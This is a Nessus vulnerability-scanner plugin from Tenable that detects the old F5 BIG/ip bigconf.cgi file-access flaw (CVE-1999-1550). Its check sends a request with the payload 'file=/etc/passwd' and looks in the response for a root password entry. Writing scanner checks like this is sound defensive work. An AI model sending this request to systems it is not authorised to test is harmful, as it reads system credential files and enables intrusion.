#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10027);
 script_bugtraq_id(778);
 script_osvdb_id(22);
 script_cve_id("CVE-1999-1550");
 script_version ("$Revision: 1.35 $");
 
 script_name(english:"F5 BIG/ip bigconf.cgi file Parameter Arbitrary File Access");
 script_summary(english:"Checks for the presence of /cgi-bin/bigconf.cgi");
 
 script_set_attribute(attribute:"synopsis", value:
"A CGI with known security vulnerabilities is installed on the remote
web server." );
 script_set_attribute(attribute:"description", value:
"The 'bigconf' CGI is installed.  This CGI has a well-known security
flaw that allows an attacker to execute arbitrary commands with the
privileges of the web server." );
 # https://web.archive.org/web/20010320222704/http://archives.neohapsis.com/archives/bugtraq/1999-q3/1543.html
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?3a3fb701"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Remove this CGI from /cgi-bin."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "1999/11/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/11/08");
 script_cvs_date("$Date: 2016/11/15 13:39:08 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "web_traversal.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (get_kb_item("www/"+port+"/generic_traversal"))
  exit(0, 'The web server on port '+port+' is vulnerable to directory traversal.');

foreach dir (cgi_dirs())
{
req = string(dir, "/bigconf.cgi?command=view_textfile&file=/etc/passwd&filters=;");
buf = http_send_recv3(method:"GET", item:req, port:port, exit_on_fail: TRUE);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:buf[2]))security_hole(port);
}

exit(0, "The remote web server on port "+port+" is not affected.");
